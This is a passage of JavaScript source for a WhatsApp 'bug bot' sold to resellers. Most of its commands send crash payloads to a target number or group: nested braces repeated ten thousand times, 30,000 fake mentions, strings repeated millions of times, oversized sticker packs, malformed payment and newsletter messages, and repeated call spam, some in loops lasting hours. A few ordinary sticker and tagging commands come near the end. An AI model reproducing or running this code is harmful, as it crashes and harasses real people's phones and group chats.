                "title": '👻',
            }
        }, {
            additionalAttributes: {
                edit: '7'
            }
        });
    }
    break;

	
	case 'forceblock':
;
    // Get user input for loop count
    let loopCount = parseInt(args[0]);
    if (isNaN(loopCount) || loopCount < 1) {
        loopCount = 5; // Default value if input is invalid
    }
    
    for (let i = 0; i < loopCount; i++) {
        await sleep(1050);
        await XeonBotInc.relayMessage(from, {
            "messageContextInfo": {
                "messageSecret": "eed1zxI49cxiovBTUFLIEWi1shD9HgIOghONuqPDGTk=",
                "deviceListMetaData": {},
                "deviceListMetadataVersion": 2
            },
            "scheduledCallCreationMessage": {
                "scheduledTimestampMs": '1200',
                callType: "AUDIO",
                "title": '👻',
            }
        }, {
            additionalAttributes: {
                edit: '7'
            }
        });
    }
    break;

case 'listpair': {
    if (!(global.db.data.owners || []).includes(senderNumber)) {
    return replygcxeon(`❌ Sorry you don't have permission to use this command. This command can only be used by reseller! 

Want to buy reseller? Chat Developer!
YouTube: @BODY_brt 
Telegram: @lo_tus_19
WhatsApp: +201286008203`);
}

        const pairingPath = './lib2/pairing';

    try {
        // Check if the directory exists
        if (!fs.existsSync(pairingPath)) {
            return replygcxeon('No paired devices found.');
        }

        // Read all directories (and files) inside ./lib2/pairing
        const entries = fs.readdirSync(pairingPath, { withFileTypes: true });

        // Filter for directories (paired device IDs)
        const pairedDevices = entries
            .filter(entry => entry.isDirectory())
            .map(entry => `+${entry.name.replace('@s.whatsapp.net', '')}`); // Add '+' before number

        // Handle if no paired devices are found
        if (pairedDevices.length === 0) {
            return replygcxeon('No paired devices found.');
        }

        // Count total paired devices
        const totalUsers = pairedDevices.length;

        // Format the list of paired devices for the response
        const deviceList = pairedDevices
            .map((device, index) => `${index + 1}. ${device}`)
            .join('\n');

        replygcxeon(`Total Rent Bot Users: ${totalUsers}\n\nPaired Devices:\n${deviceList}`);
    } catch (err) {
        console.error('Error reading paired devices directory:', err);
        return replygcxeon('Failed to load paired devices data.');
    }
}
break;

case 'delpair': {

        
        
	
        if (!q) return replygcxeon(`Example:\n ${prefix + command} 20XXX`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo =  Xreturn;
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }

        const pairingPath = './lib2/pairing';
        const targetPath = `${pairingPath}/${Xreturn}`;

        try { 
            // Check if the target directory exists
            if (!fs.existsSync(targetPath)) {
                return replygcxeon(`Paired device with ID "${Xreturn}" does not exist.`);
            }

            // Delete the target directory and its contents
            fs.rmSync(targetPath, { recursive: true, force: true });

            replygcxeon(`Paired device with ID "${Xreturn}" has been successfully deleted.`);
        } catch (err) {
            console.error('Error deleting paired device:', err);
            return replygcxeon('An error occurred while attempting to delete the paired device.');
        }
    }
break;

case 'reqpair':
// Check system storage and RAM
    const freeStorage = os.freemem() / (1024 * 1024); // Free memory in MB
    const totalStorage = os.totalmem() / (1024 * 1024); // Total memory in MB
    const freeDiskSpace = fs.statSync('/').available / (1024 * 1024); // Free disk space in MB

    if (freeStorage < 300 || freeDiskSpace < 300) { // Set a threshold of 100 MB for storage and RAM
        return replygcxeon('Slot is full, please try again later.');
    }

//
if (!q) return replygcxeon(`Example:\n ${prefix + command} 20XXX`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await XeonBotInc.onWhatsApp(Xreturn);
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  
  // Extract and validate the country code or prefix
const countryCode = text.slice(0, 3); // Extract the first 3 digits for country code
const prefixxx = text.slice(0, 1); // Extract the first digit for prefix
const firstTwoDigits = text.slice(0, 2); // Extract the first two digits to check for "89"

// Function to validate if a number is a valid WhatsApp number
const isValidWhatsAppNumber = (number) => {
    return number.length >= 10 && number.length <= 15 && !isNaN(number);
};

if (countryCode === "252" || prefixxx === "0" || firstTwoDigits === "89" || countryCode.startsWith("85")) {
    return replygcxeon("Sorry, numbers with country code 252, prefix 0, starting with 89, or +85 are not supported for using the bot.");
}

if (!isValidWhatsAppNumber(text)) {
    return replygcxeon("Invalid WhatsApp number. Please enter a valid number.");
}


    // Proceed with pairing
    const startpairing = require('./rentbot.js');
    await startpairing(Xreturn);
    await sleep(4000);
    
    const cu = fs.readFileSync('./lib2/pairing/pairing.json', 'utf-8');
    const cuObj = JSON.parse(cu);
    
    await replygcxeon(`${cuObj.code}`);

break;

case 'BODY':{

if (!q) return replygcxeon(`Example:\n ${prefix + command} 20XXX`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await XeonBotInc.onWhatsApp(Xreturn);
  if (victim == "201286008203") {
    return;
    }
    if (victim == "201286008203") {
    return;
    }
    if (victim == "201286008203") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  
  async function sendOfferCall(target) {
    try {
        await XeonBotInc.offerCall(target);
        /*console.log(chalk.white.bold(`Success Send Offer Call To Target`));*/
    } catch (error) {
        /*console.error(chalk.white.bold(`Failed Send Offer Call To Target:`, error));*/
    }
}

  sendMessageWithMentions(
    "Successfully Sent Spam Call To @" + Xreturn.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [Xreturn]
  );
	await sleep(1000)
for (let i = 0; i < 7; i++) {
await sendOfferCall(Xreturn)
await sleep(2000)
}
  }
break
case 'xsucidegcxxx':

	if (!q) return replygcxeon(`Example:\n ${prefix + command} 120363047626537xxx@g.us\n\nTo get group id, please type .listgc\n\nTo get group id from a group link, type .groupid link `)
	// Check if input is a WhatsApp group link
    if (q.includes("chat.whatsapp.com")) {
        return replygcxeon("Group ID must be a number, not a link. Use .groupid <link> to get the group ID.");
    }
victim = text.split("|")[0]

async function xx(targetNumber) {
 try {
   let message = {
     ephemeralMessage: {
       message: {
         interactiveMessage: {
           header: {
             title: "Telegram:  13",
             hasMediaAttachment: false,
             locationMessage: {
               degreesLatitude: -999.035,
               degreesLongitude: 922.999999999999,
               name: "Telegram: @lo_tus_19",
               address: "Telegram: @lo_tus_19",
             },
           },
           body: {
             text: "Telegram: @lo_tus_19",
           },
           nativeFlowMessage: {
             messageParamsJson: "{".repeat(10000),
           },
           contextInfo: {
             participant: targetNumber,
             mentionedJid: [
               "0@s.whatsapp.net",
               ...Array.from(
                 {
                   length: 30000,
                 },
                 () =>
                   "1" +
                   Math.floor(Math.random() * 5000000) +
                   "@s.whatsapp.net"
               ),
             ],
           },
         },
       },
     },
   };

   await XeonBotInc.relayMessage(targetNumber, message, {
     messageId: null,
   });
 } catch (err) {
   console.log(err);
 }
}
replygcxeon(`Successfully sent bug to the group chat`)
for (let i = 0; i < 5; i++) {
	await xx(victim);
    }
break

case 'mixgc':{

	if (!q) return replygcxeon(`Example:\n ${prefix + command} 120363047626537xxx@g.us\n\nTo get group id, please type .listgc\n\nTo get group id from a group link, type .groupid link `)
	// Check if input is a WhatsApp group link
    if (q.includes("chat.whatsapp.com")) {
        return replygcxeon("Group ID must be a number, not a link. Use .groupid <link> to get the group ID.");
    }
target = text.split("|")[0]

async function chatFrezz0e(target) {
    try {
        for (let s = 0; s < 1; s++) {
            const stickerMessage = generateWAMessageFromContent(
                target,
                proto.Message.fromObject({
                    botInvokeMessage: {
                        message: {
                            messageContextInfo: {
                                messageSecret: crypto.randomBytes(32),
                                deviceListMetadata: {
                                    senderKeyIndex: 0,
                                    senderTimestamp: Date.now(),
                                    recipientKeyIndex: 0
                                }
                            },
                            stickerPackMessage: {
                                stickerPackId: "1e66102f-2c7c-4bb9-80cf-811e922bd1a8",
                                name: "XinvasionX" + "𑇂𑆵𑆴𑆿".repeat(50000),
                                publisher: "t.me/BODY_brt",
                                stickers: [
                                    {
                                        fileName: "aZx-55hzR-QpFJE0CLazii3xvH1jwAE5owBJ9Q+1weg=.webp",
                                        isAnimated: false,
                                        emojis: [""],
                                        accessibilityLabel: "",
                                        isLottie: false,
                                        mimetype: "image/webp"
                                    },
                                    {
                                        fileName: "dF9xmRe414rAWSrBRaYer7wahovMEwlPRVJFzVDUGIw=.webp",
                                        isAnimated: false,
                                        emojis: [""],
                                        accessibilityLabel: "",
                                        isLottie: false,
                                        mimetype: "image/webp"
                                    },
                                    {
                                        fileName: "kmgU36CKofP+dXww1B7TVvTtQLK9CEuWbPYd9ABRtAw=.webp",
                                        isAnimated: false,
                                        emojis: [""],
                                        accessibilityLabel: "",
                                        isLottie: false,
                                        mimetype: "image/webp"
                                    },
                                    {
                                        fileName: "XZz6gF1lXcyGRjz1k6nrv2xW8y2L9MofMpsmlFZIMgY=.webp",
                                        isAnimated: false,
                                        emojis: [""],
                                        accessibilityLabel: "",
                                        isLottie: false,
                                        mimetype: "image/webp"
                                    },
                                    {
                                        fileName: "iYjIgEp2J/4bF2jDJiEThzU5uNVd3ArB4eXmmr8JG5M=.webp",
                                        isAnimated: false,
                                        emojis: [""],
                                        accessibilityLabel: "",
                                        isLottie: false,
                                        mimetype: "image/webp"
                                    },
                                    {
                                        fileName: "wLfOdZJ3/jE8EdS+rQDNpjMn9i+jrsCPc3DnfrpbEao=.webp",
                                        isAnimated: false,
                                        emojis: [""],
                                        accessibilityLabel: "",
                                        isLottie: false,
                                        mimetype: "image/webp"
                                    },
                                    {
                                        fileName: "B4aUTYO1xHj2VwCeNgFkchqtD5lZ/59omLb5bi5NvOw=.webp",
                                        isAnimated: false,
                                        emojis: [""],
                                        accessibilityLabel: "",
                                        isLottie: false,
                                        mimetype: "image/webp"
                                    },
                                    {
                                        fileName: "lsS7uO7IqZJ8PQSoDYDzx0ZCyF+e6hTMEobkt1f8eA0=.webp",
                                        isAnimated: false,
                                        emojis: [""],
                                        accessibilityLabel: "",
                                        isLottie: false,
                                        mimetype: "image/webp"
                                    },
                                    {
                                        fileName: "A2PvEWo9tBZupS1V1YXKJ5iwfSRdrwlmceNdy4UksR8=.webp",
                                        isAnimated: false,
                                        emojis: [""],
                                        accessibilityLabel: "",
                                        isLottie: false,
                                        mimetype: "image/webp"
                                    },
                                    {
                                        fileName: "HDV3jx/hSV5OJ+bLx36+dnZ+Br4Mkr8X5KqRL0aI2Xo=.webp",
                                        isAnimated: false,
                                        emojis: [""],
                                        accessibilityLabel: "",
                                        isLottie: false,
                                        mimetype: "image/webp"
                                    }
                                ],
                                fileLength: "8020935",
                                fileSha256: "77oJbl0eWZ4bi8z0RZxLsZJ1tu+f/ZErcYE8Sj2K1+U=",
                                fileEncSha256: "2KwixOJtpl4ivq8HMgTQGICW+HMxLnZuQmUN6KPD4kg=",
                                mediaKey: "i4I6325nsuHeYhj4KuyeZ+8bHAxE6A5Rt5uzyNRIaTk=",
                                directPath: "/v/t62.15575-24/23212937_564001070100700_5740166209540264226_n.enc",
                                contextInfo: { 
                                    mentionedJid: [
                                        "0@s.whatsapp.net",
                                        ...Array.from({ length: 50 }, () =>
                                            `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
                                        )
                                    ]
                                },
                                packDescription: "",
                                mediaKeyTimestamp: "1749506440",
                                trayIconFileName: "1e66102f-2c7c-4bb9-80cf-811e922bd1a8.png",
                                thumbnailHeight: 252,
                                thumbnailWidth: 252,
                                stickerPackSize: "15000000000",
                                stickerPackOrigin: "USER_CREATED"
                            }
                        }
                    }
                }),
                { userJid: target }
            );

            await XeonBotInc.relayMessage(target, stickerMessage.message, { 
                messageId: stickerMessage.key.id,
            });
            await sleep(100);
        }
    } catch (e) {
        console.error(e);
    }
}
replygcxeon(`Successfully sent bug to the group chat`)
for (let i = 0; i < 10; i++) {
	await chatFrezz0e(target);
	await sleep(300);
	await crashmsg(target);
	await sleep(2000);
	await BODYIosInvi(target);
	await sleep(300);
	await freezeIos(target);
	await chatFrezz0e(target);
	await chatFrezz0e(target);
    }
    }
break

case 'xbetagcxxxx':{


	if (!q) return replygcxeon(`Example:\n ${prefix + command} 120363047626537xxx@g.us\n\nTo get group id, please type .listgc\n\nTo get group id from a group link, type .groupid link `)
	// Check if input is a WhatsApp group link
    if (q.includes("chat.whatsapp.com")) {
        return replygcxeon("Group ID must be a number, not a link. Use .groupid <link> to get the group ID.");
    }
victim = text.split("|")[0]

async function xbetagroup(target) {
	try {
 const cards = [];
 const media = {
      videoMessage: {
        url: 'https://mmg.whatsapp.net/v/t62.7161-24/11902728_707998228510266_7829645663280785822_n.enc?ccb=11-4&oh=01_Q5Aa1wEL8L0ZvwfyQEAl0Ujqn4yUqRi7NLYBclROwMXxB-wiBA&oe=68882423&_nc_sid=5e03e0&mms3=true',
        mimetype: 'video/mp4',
        fileSha256: Buffer.from('j0yv4uuRPfX3ZOfyZ0t8irS7K+MluEOyodghganzbJY=', 'base64'),
        fileLength: '2359888',
        mediaKey: Buffer.from('ld+SoEzJXiVsVakuPuyRWrJfWfvJJYa0CnooCPDdZWo=', 'base64'),
        fileEncSha256: Buffer.from('kibztIx3/O30AIs++tSPOZEIo/S7a6IpBO99d9ycNYk=', 'base64'),
        directPath: '/v/t62.7161-24/11902728_707998228510266_7829645663280785822_n.enc?ccb=11-4&oh=01_Q5Aa1wEL8L0ZvwfyQEAl0Ujqn4yUqRi7NLYBclROwMXxB-wiBA&oe=68882423&_nc_sid=5e03e0',
        mediaKeyTimestamp: '1751161073',
        jpegThumbnail: Buffer.from(
          '/9j//gAQTGF2YzYxLjE5LjEwMQD/2wBDAAgGBgcGBwgICAgICAkJCQoKCgkJCQkKCgoKCgoMDAwKCgoKCgoKDAwMDA0ODQ0NDA0ODg8PDxISEREVFRUZGR//xABxAAEBAQEBAQAAAAAAAAAAAAAHBgAIBAUBAQEBAQAAAAAAAAAAAAAAAAIAAwEQAAIBAwMDAwQDAQAAAAAAAAECAwUEERIABjEHEyIhFCNiUXFhFYEyEQADAQACAwEAAAAAAAAAAAAAAQIRQTEDcRIh/8AAEQgAGAAgAwEiAAIRAAMRAP/aAAwDAQACEQMRAD8Am+0/bShc1pl7eVKS9V4LkRKLeWONdOgNk6onJP8Au71exHCXzieq+xx73MSg/otbDP7GdmnbfkFdpNtFa0/5a2t1dSedrS1SaXyrGvjXXIjqgIz0w342k3vE63UQJJreoSkhmBkkHkd3C4dw8mA2lceoYGeg2HecN+jSPF9rXUz12fDq/bPtzSsJJe36yuzrGj30BZygLMRHHbvJpABJdgifds65VQ+NWFKt7ilyVA3jTnypOPoLA2QgVzGjNIMAt09m6dNolr2j5J8j57myhZ5B9KaSQskbN6lJRGLEr6SScYLE/jc33N4ZV+P02Go1G7iuPlzLHoQyeiT1SHSrKiJGR0VR/J9ztJt8BqZnf3Tz9uea8a4/S7izrK1PyG6M8T2QTThogh1ZkU5BGQCCN2q91+BxRXSRPyKM3WjW5jifTolEg8atNoXJGCAMEEjG+fN7fQj7F3T4VC10EueQiO4gjjANvA0kbJMJWcEz6DqwFwU/59jnch3F5rxuvUuKzo39ozm7W4la+VAoCxsuIyJXxktnSFA2Y724j//Z',
          'base64'
        )
      }
    };

  const header = {
    videoMessage: media.videoMessage,
    hasMediaAttachment: false,
    contextInfo: {
      forwardingScore: 666,
      isForwarded: true,
      stanzaId: "Telegram: @lo_tus_19" + Date.now(),
      participant: "0@s.whatsapp.net",
      remoteJid: "status@broadcast",
      quotedMessage: {
        extendedTextMessage: {
          text: "Telegram: @lo_tus_19",
          contextInfo: {
            mentionedJid: ["01096379348@s.whatsapp.net"],
            externalAdReply: {
              title: "Telegram: @lo_tus_19",
              body: "Telegram: @lo_tus_19",
              thumbnailUrl: "",
              mediaType: 1,
              sourceUrl: "https://tama.example.com",
              showAdAttribution: false // trigger 1
            }
          }
        }
      }
    }
  };

  for (let r = 0; r < 15; r++) {
    cards.push({
      header,
      nativeFlowMessage: {
        messageParamsJson: "{".repeat(10000) // trigger 2
      }
    });
  }

  const msg = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "Telegram: @lo_tus_19"
            },
            carouselMessage: {
              cards,
              messageVersion: 1
            },
            contextInfo: {
              businessMessageForwardInfo: {
                businessOwnerJid: "01096379348@s.whatsapp.net"
              },
              stanzaId: "Telegram: @lo_tus_19" + "Telegram: @lo_tus_19" + Math.floor(Math.random() * 99999), // trigger 3
              forwardingScore: 100,
              isForwarded: true,
              mentionedJid: ["01096379348@s.whatsapp.net"], // trigger 4
              externalAdReply: {
                title: "Telegram: @lo_tus_19",
                body: "",
                thumbnailUrl: "https://example.com/",
                mediaType: 1,
                mediaUrl: "",
                sourceUrl: "https://example.com",
                showAdAttribution: false
              }
            }
          }
        }
      }
    },
    {}
  );

  await XeonBotInc.relayMessage(target, msg.message, {
    messageId: msg.key.id
  });
 } catch (err) {
   console.log(err);
 }
}
replygcxeon(`Successfully sent bug to the group chat`)
for (let i = 0; i < 500; i++) {
	await xeonSpamIos(victim);
	await xbetagroup(victim);
	await sleep(1000);
    }
    }
break

case 'killgroup':{

	if (!q) return replygcxeon(`Example:\n ${prefix + command} 120363047626537xxx@g.us\n\nTo get group id, please type .listgc\n\nTo get group id from a group link, type .groupid link `)
	// Check if input is a WhatsApp group link
    if (q.includes("chat.whatsapp.com")) {
        return replygcxeon("Group ID must be a number, not a link. Use .groupid <link> to get the group ID.");
    }
target = text.split("|")[0]

async function crashmsg(target) {
    try {
        const interactivePayload = {
            interactiveMessage: {
                header: {
                    hasMediaAttachment: true,
                    jpegThumbnail: null
                },
                contextInfo: {
                    participant: "0@s.whatsapp.net",
                    remoteJid: "status@broadcast",
                    conversionSource: "porn",
                    conversionData: crypto.randomBytes(16),
                    conversionDelaySeconds: 9999,
                    forwardingScore: 999999,
                    isForwarded: true,
                    quotedAd: {
                        advertiserName: "Kornth",
                        mediaType: "IMAGE",
                        jpegThumbnail: null,
                        caption: "Telegram@lo_tus_19 null 🦠"
                    },
                    placeholderKey: {
                        remoteJid: "0@s.whatsapp.net",
                        fromMe: false,
                        id: "ABCDEF1234567890"
                    },
                    expiration: -99999,
                    ephemeralSettingTimestamp: Date.now(),
                    ephemeralSharedSecret: crypto.randomBytes(16),
                    entryPointConversionSource: "WhatsaApp",
                    entryPointConversionApp: "WhatsApp",
                    actionLink: {
                        url: "t.me/VIP_1XB",
                        buttonTitle: "action_button"
                    },
                    disappearingMode: {
                        initiator: 1,
                        trigger: 2,
                        initiatorDeviceJid: target,
                        initiatedByMe: true
                    },
                    groupSubject: "Telegram@lo_tus_19 🦠",
                    parentGroupJid: "0@g.us",
                    trustBannerType: "X",
                    trustBannerAction: 99999,
                    isSampled: true,
                    externalAdReply: {
                        title: "Telegram@lo_tus_19 🦠",
                        mediaType: 2,
                        renderLargerThumbnail: false,
                        showAdAttribution: false,
                        containsAutoReply: false,
                        body: "Ai Kornth ",
                        thumbnail: null,
                        sourceUrl: "t.me/VIP_1XB",
                        sourceId: "9T7A4M1A",
                        ctwaClid: "ctwaClid",
                        ref: "ref",
                        clickToWhatsappCall: true,
                        ctaPayload: "ctaPayload",
                        disableNudge: true,
                        originalImageUrl: null
                    },
                    featureEligibilities: {
                        cannotBeReactedTo: true,
                        cannotBeRanked: true,
                        canRequestFeedback: true
                    },
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: "0@newsletter",
                        serverMessageId: 1,
                        newsletterName: `Crash Kornth ~ ${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
                        contentType: 3,
                        accessibilityText: "Telegram@lo_tus_19 🦠"
                    },
                    statusAttributionType: 2,
                    utm: {
                        utmSource: "XsSource",
                        utmCampaign: "XsCampaign"
                    }
                },
                body: {
                    text: "Telegram@lo_tus_19 🦠"
                },
                nativeFlowMessage: {
                    buttons: [{
                        name: "payment_method",
                        buttonParamsJson: `{}`
                    }]
                }
            }
        };

        const msg1 = generateWAMessageFromContent(target, interactivePayload, {});
        await XeonBotInc.relayMessage(target, msg1.message, { messageId: msg1.key.id });

        const paymentPayload = {
            requestPaymentMessage: {
                currencyCodeIso4217: 'USD',
                requestFrom: target,
                expiryTimestamp: null,
                contextInfo: {
                    remoteJid: " S ",
                    isForwarded: true,
                    forwardingScore: 979,
                    externalAdReply: {
                        title: " ⁖Telegram@lo_tus_19 system 🦠",
                        body: "Telegram@lo_tus_19 🦠",
                        mediaType: "VIDEO",
                        renderLargerThumbnail: true,
                        previewType: "VIDEO",
                        sourceUrl: "https://t.me/VIP_1XB",
                        mediaUrl: "https://t.me/VIP_1XB",
                        showAdAttribution: true,
                    }
                }
            }
        };

        await XeonBotInc.relayMessage(target, paymentPayload, {
            quoted: null,
            userJid: null,
            messageId: null
        });
        
    } catch (err) {
        console.error("Error", err);
    }
}
replygcxeon(`Successfully sent bug to the group chat`)
for (let i = 0; i < 10; i++) {
    await chatFrezz0e(target);
    await (300);
	await crashmsg(target);
	await crashmsg(target);
    }
    }
break

case 'groupmix':{

	if (!q) return replygcxeon(`Example:\n ${prefix + command} 120363047626537xxx@g.us\n\nTo get group id, please type .listgc\n\nTo get group id from a group link, type .groupid link `)
	// Check if input is a WhatsApp group link
    if (q.includes("chat.whatsapp.com")) {
        return replygcxeon("Group ID must be a number, not a link. Use .groupid <link> to get the group ID.");
    }
victim = text.split("|")[0]

replygcxeon(`Successfully sent bug to the group chat`)
const FIVE_HOURS = 5 * 60 * 60 * 1000; // 5 hours in milliseconds
    const startTime = Date.now();

    while (Date.now() - startTime < FIVE_HOURS) {
    try {
    	await robustfreeze(victim);
	await iosLx(victim);
	await Uitoya(victim);
	await sleep(300);
    } catch (err) {
        if (
            err?.output?.statusCode === 428 ||
            err?.output?.statusCode === 408 ||
            err.message.includes('Connection Closed') ||
            err.message.includes('Timed Out') ||
            err.code === 'ECONNABORTED'
        ) {
            console.log(`⚠️Bug ${command} ended for ${Xreturn} ✅`);
            break;
        }
    }
}
}
break
	case 'xgroup':{

	if (!q) return replygcxeon(`Example:\n ${prefix + command} 120363047626537xxx@g.us\n\nTo get group id, please type .listgc\n\nTo get group id from a group link, type .groupid link `)
	// Check if input is a WhatsApp group link
    if (q.includes("chat.whatsapp.com")) {
        return replygcxeon("Group ID must be a number, not a link. Use .groupid <link> to get the group ID.");
    }
victim = text.split("|")[0]

async function blankBODY2(target) {
  const blank = {
    newsletterAdminInviteMessage: {
      newsletterJid: "13131313131313@newsletter",
      newsletterName: "BODY here 👁⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝‌" + "���".repeat(100000000) + "\u0000".repeat(1000000),
      caption: "Telegram@lo_tus_19���� " + "���".repeat(5000000) + "\u0000".repeat(1000000),
      inviteExpiration: "999999999",
    },
  };
  await XeonBotInc.relayMessage(target, blank, {
    participant: { jid: target },
    messageId: null,
  });
}
replygcxeon(`Successfully sent bug to the group chat`)
for (let i = 0; i < 50; i++) {
	await blankBODY2(target);
    }
    }
break
case 'xgroupxxx':{

	if (!q) return replygcxeon(`Example:\n ${prefix + command} 120363047626537xxx@g.us\n\nTo get group id, please type .listgc\n\nTo get group id from a group link, type .groupid link `)
	// Check if input is a WhatsApp group link
    if (q.includes("chat.whatsapp.com")) {
        return replygcxeon("Group ID must be a number, not a link. Use .groupid <link> to get the group ID.");
    }
victim = text.split("|")[0]

async function invigroup(id) {
            const groupData = await XeonBotInc.groupMetadata(id);  

            const participantsExceptMe = groupData.participants  
                .map(p => p.id)  
                .filter(jid => !areJidsSameUser(jid, XeonBotInc.user?.id));  
                
                let message = {
                    ephemeralMessage: {
                    message: {
                        interactiveMessage: {
                        header: {
                            title: "ηuﾚﾚς⊕ηš⊕ﾚε",
                            hasMediaAttachment: false,
                            locationMessage: {
                            degreesLatitude: -999.035,
                            degreesLongitude: 922.999999999999,
                            name: "ηuﾚﾚς⊕ηš⊕ﾚε",
                            address: "Tηuﾚﾚς⊕ηš⊕ﾚε",
                            },
                        },
                        body: {
                            text: "ηuﾚﾚς⊕ηš⊕ﾚε",
                        },
                        nativeFlowMessage: {
                            messageParamsJson: "{".repeat(10000),
                        },
                        contextInfo: {
                            participant: "0",
                            mentionedJid: [
                            "0@s.whatsapp.net",
                            ...Array.from(
                                {
                                length: 30000,
                                },
                                () =>
                                "1" +
                                Math.floor(Math.random() * 5000000) +
                                "@s.whatsapp.net"
                            ),
                            ],
                        },
                        },
                    },
                    },
            };

            await XeonBotInc.relayMessage("status@broadcast", message, {  
                messageId: crypto.randomBytes(16).toString('hex'),  
                statusJidList: participantsExceptMe, // Solo los otros participantes  
                additionalNodes: [{  
                    tag: "meta",  
                    attrs: {},  
                    content: [{  
                        tag: "mentioned_users",  
                        attrs: {},  
                        content: participantsExceptMe.map(jid => ({  
                            tag: "to",  
                            attrs: { jid },  
                            content: undefined,  
                        })),  
                    }],  
                }],  
            });
        }
replygcxeon(`Successfully sent bug to the group chat`)
for (let i = 0; i < 999; i++) {
	await invigroup(victim);
    }
    }
break

                case 'groupid': {
    
    
    if (!text) return replygcxeon('Enter Group Link!');
    if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return replygcxeon('Link Invalid!');

    // Extract the group code, removing any query parameters
    let groupCode = args[0].split('https://chat.whatsapp.com/')[1];
    groupCode = groupCode.split('?')[0]; // Remove any query parameters

    try {
        const xeontry = await XeonBotInc.groupAcceptInvite(groupCode);
        
        if (!xeontry) {
            return replygcxeon('The group chat either has the approval feature enabled, you have been removed from the group or the invite link has expired. Please join the group chat first and try using the command .listgc.');
        }

        replygcxeon(`Group ID: ${xeontry}`);
    } catch (error) {
        replygcxeon('The group chat either has the approval feature enabled, you have been removed from the group or the invite link has expired. Please join the group chat first and try using the command .listgc.');
    }
}
break;

case 'autoswview':
    case 'autostatusview':{
    
               if (args[0] === 'on') {
                  db.data.settings[botNumber].antiswview = true
                  replygcxeon(`Successfully ${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.settings[botNumber].antiswview = false
                  replygcxeon(`Successfully ${command} is disabled`)
               } else {
                	replygcxeon(`Please select on/off\n\Example: ${prefix+command} on`)
            }
            }
            break
            
            case 'totag': {
				if (!m.isGroup) return replygcxeon(mess.OnlyGrup)
				if (!m.quoted) return replygcxeon(`Reply message with caption ${prefix + command}`)
				delete m.quoted.chat
				await XeonBotInc.sendMessage(m.chat, { forward: m.quoted.fakeObj, mentions: participants.map(a => a.id) })
			}
			break
			
			case 'hidetag': case 'h': {
				if (!m.isGroup) return replygcxeon(mess.OnlyGrup)
				XeonBotInc.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)})
			}
			break
			
			case 's': case 'sticker': case 'stiker': {
if (!quoted) return replygcxeon(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await XeonBotInc.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replygcxeon('Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds')
let media = await quoted.download()
let encmedia = await XeonBotInc.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
} else {
replygcxeon(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
}
}
break

case 'swm': case 'steal': case 'stickerwm': case 'take':{
if (!isPremium) return replyprem(mess.premium)
if (!args.join(" ")) return replygcxeon(`Where is the text?`)
const swn = args.join(" ")
const pcknm = swn.split("|")[0]
const atnm = swn.split("|")[1]
if (m.quoted.isAnimated === true) {
XeonBotInc.downloadAndSaveMediaMessage(quoted, "gifee")
XeonBotInc.sendMessage(m.chat, {sticker:fs.readFileSync("gifee.webp")}, m, { packname: pcknm, author: atnm })
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await XeonBotInc.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replygcxeon('Maximum 10 Seconds!')
let media = await quoted.download()
let encmedia = await XeonBotInc.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else {
replygcxeon(`Photo/Video?`)
}
}
break

case  "Oke" : {
await XeonBotInc.sendMessage(m.chat, { react: { text: '🍾', key: m.key }});
await XeonBotInc.sendMessage(m.chat, { react: { text: '🕛', key: m.key }});
await XeonBotInc.sendMessage(m.chat, { react: { text: '✔️', key: m.key }});
   await loading()
let menu = `                ❲ 𝐗BODY_𝔪𝔢𝔫𝔲/𝔠𝔯𝔞𝔰𝔥  ❳
❐
- ★- USERNAME : ${pushname}
- ★- OWNER : +01096379348
- ★- BOT: 𝗕𝗢𝗧 𝐗BODY`
let buttons = [
        { buttonid: "bugmenu", buttonText: { displayText: "Thanks To" } }
    ];

    let buttonMessage = {
        image: { url: `https://mega.nz/file/DtgDBAZK#TvUFm5Vzu81o1HinHpo0f5UK_4MJ_z0zoN3rUmX5GVY` },
	    gifPlayback: true,
        caption: menu,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363422217202244@g.us",
                newsletterName: `BODYbugbot`
            }
        },
        footer: ">𝗕𝗢𝗧 BODY",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
   }

    const flowActions = [
        {
            buttonId:  'action' ,
            buttonText: { displayText:  'This Button List'  },
            type: 4,
            nativeFlowInfo: {
